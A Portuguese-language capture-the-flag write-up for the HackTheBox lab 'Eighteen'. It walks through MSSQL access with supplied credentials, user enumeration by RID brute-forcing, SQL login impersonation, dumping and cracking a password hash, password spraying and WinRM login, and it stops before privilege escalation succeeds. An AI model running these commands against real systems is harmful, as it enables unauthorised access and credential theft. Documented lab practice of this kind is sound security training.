---
description: CTF HackTheBox - Easy
---

# Eighteen

### 1. Reconhecimento e Enumeração Inicial

O alvo é um sistema operacional Windows, conforme indicado pelo serviço WinRM (5985) e Microsoft SQL Server (1433).

#### 1.1. Varredura de Portas e Serviços

A varredura inicial identificou três portas-chave:

* TCP 80: HTTP (Microsoft IIS)
* TCP 1433: MS SQL Server (Microsoft SQL Server 2022 RTM)
* TCP 5985: WinRM (HTTP over SSL para gerenciamento remoto)

<figure><img src="../../../.gitbook/assets/Pasted image 20251118062805 1.png" alt=""><figcaption></figcaption></figure>

```shellscript
# Varredura inicial de portas abertas 
rustscan -a $IP -- -sVC -oN versionPorts.txt
```

#### 1.2. Enumeração Web e Credenciais Iniciais

O acesso ao serviço Web na porta 80 permitiu a criação de um usuário através da rota `/register`.&#x20;

<figure><img src="../../../.gitbook/assets/Pasted image 20251118063339.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Pasted image 20251118063526.png" alt=""><figcaption></figcaption></figure>

As credenciais fornecidas na descrição do desafio (`kevin:iNa2we6haRj2gaw!`) foram testadas no _login_ e no acesso à rota `/admin`, resultando em Access Denied.

<figure><img src="../../../.gitbook/assets/Pasted image 20251118063835.png" alt=""><figcaption></figcaption></figure>

*   DNS Descobertos: `eighteen.htb` e `dc01.eighteen.htb`.

    ```shellscript
    echo "$IP eighteen.htb dc01.eighteen.htb" | sudo tee -a /etc/hosts
    ```

<figure><img src="../../../.gitbook/assets/Pasted image 20251118064627.png" alt=""><figcaption></figcaption></figure>

### 2. Exploração do MSSQL (Porta 1433)

A credencial inicial (`kevin:iNa2we6haRj2gaw!`) foi validada para o serviço MSSQL.

#### 2.1. Conexão e Enumeração de Usuários (AD/SAMR)

Conexão inicial com `impacket-mssqlclient` e enumeração de usuários do sistema através do NetExec, utilizando as credenciais SQL para realizar _RID-bruting_ via SMB/SAMR.

```shellscript
# Conexão inicial e verificação de privilégios
impacket-mssqlclient 'kevin:iNa2we6haRj2gaw!@eighteen.htb'
```

<figure><img src="../../../.gitbook/assets/Pasted image 20251118065240.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Pasted image 20251118070055.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Pasted image 20251118070335.png" alt=""><figcaption></figcaption></figure>

```shellscript
# Enumeração de usuários (RID Brute) via NetExec
nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
```

<figure><img src="../../../.gitbook/assets/Pasted image 20251118064848.png" alt=""><figcaption></figcaption></figure>



#### 2.2. Escalonamento de Privilégios no SQL Server (IMPERSONATE)

O usuário `kevin` não possuía acesso ao banco de dados `financial_planner`. Foi realizada uma busca por privilégios de personificação (`IMPERSONATE`).

```sql
-- Identificação de usuários que podem ser personificados
SELECT distinct b.name FROM sys.server_permissions a 
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id 
WHERE a.permission_name = 'IMPERSONATE'

-- Execução da personificação
EXECUTE AS USER = 'appdev';
```

<figure><img src="../../../.gitbook/assets/Pasted image 20251118070508.png" alt=""><figcaption></figcaption></figure>

A personificação do usuário `appdev` concedeu acesso ao banco de dados e a permissão para extrair dados da tabela `users`.

```sql
-- Acesso ao DB e dump de hash
USE financial_planner;
SELECT name FROM sys.tables;
SELECT * FROM users; 
```

<figure><img src="../../../.gitbook/assets/Pasted image 20251118070857.png" alt=""><figcaption></figcaption></figure>

### 3. Quebra de Hash (Hashcat)

O hash do usuário `admin` foi extraído no formato PBKDF2:SHA256, sendo necessário o recodificação e formatação para o Hashcat, utilizando o modo `10900` (Microsoft SQL Server 2012+).

<figure><img src="../../../.gitbook/assets/Pasted image 20251118071607.png" alt=""><figcaption></figcaption></figure>

A string de hash foi formatada para incluir o salt e o hash em Base64, separando-os por `$:`.

<figure><img src="../../../.gitbook/assets/Pasted image 20251118071811.png" alt=""><figcaption></figcaption></figure>

```shellscript
# Comando de quebra de senha com hashcat
hashcat -m 10900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../../.gitbook/assets/Pasted image 20251118072113.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Pasted image 20251118072146.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Pasted image 20251118072259.png" alt=""><figcaption></figcaption></figure>

### 4. Acesso ao Sistema Operacional (User Flag)

A senha `iloveyou1` foi testada contra o serviço WinRM (porta 5985) em um _password spray_ com a lista de usuários enumerada, obtendo sucesso no login com o usuário `adam.scott`.

```shellscript
# Acesso remoto via WinRM
evil-winrm -i eighteen.htb -u adam.scott -p 'iloveyou1'
```

<figure><img src="../../../.gitbook/assets/Pasted image 20251118073016.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Pasted image 20251118073123.png" alt=""><figcaption></figcaption></figure>

### 5. Escalada de Privilégios (Privesc)

Após o acesso, a ferramenta WinPEAS.exe foi executada para identificar vetores de escalonamento.

<figure><img src="../../../.gitbook/assets/Pasted image 20251118131017.png" alt=""><figcaption></figcaption></figure>

#### 5.1. Identificação de Vetor

A análise do _output_ do WinPEAS não revelou muita coisa, seguimos investigandoo

<figure><img src="../../../.gitbook/assets/Pasted image 20251118113024.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Pasted image 20251118122255.png" alt=""><figcaption></figcaption></figure>

Nem no bloodhound\


<figure><img src="../../../.gitbook/assets/Pasted image 20251118123303 (1).png" alt=""><figcaption></figcaption></figure>
